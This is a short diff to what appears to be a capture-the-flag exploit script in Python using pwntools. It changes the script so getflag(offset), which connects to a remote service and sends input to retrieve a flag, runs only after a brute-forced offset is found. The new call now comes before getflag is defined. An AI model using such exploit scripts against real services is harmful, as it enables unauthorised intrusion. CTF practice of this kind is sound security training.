@@ -27,6 +27,8 @@ def brute():
             break
 
 offset = brute()
+if offset:
+    getflag(offset)
 
 def getflag(offset):
     io = remote(f'{hostname}', f'{port}')
@@ -36,5 +38,3 @@ def getflag(offset):
     io.sendline(b'wp')
     flag = io.recvall()
     success(flag)
-
-getflag(offset)
